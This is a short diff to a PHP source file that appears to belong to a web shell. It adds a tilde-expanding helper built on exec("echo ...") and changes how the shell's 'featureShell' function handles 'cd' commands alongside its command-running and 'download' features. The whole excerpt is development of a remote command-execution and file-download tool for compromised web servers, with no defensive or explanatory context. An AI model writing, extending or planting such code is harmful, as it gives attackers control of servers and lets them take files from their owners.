@@ -1,14 +1,22 @@
 <?php
 
+function expandPath($path) {
+    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
+        exec("echo $match[1]", $stdout);
+        return $stdout[0] . $match[2];
+    }
+    return $path;
+}
+
 function featureShell($cmd, $cwd) {
     $stdout = array();
 
-    if (preg_match("/^\s*cd\s*$/", $cmd)) {
-        // pass
+    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
+        chdir(expandPath("~"));
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
         chdir($cwd);
         preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
-        chdir($match[1]);
+        chdir(expandPath($match[1]));
     } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
         chdir($cwd);
         preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
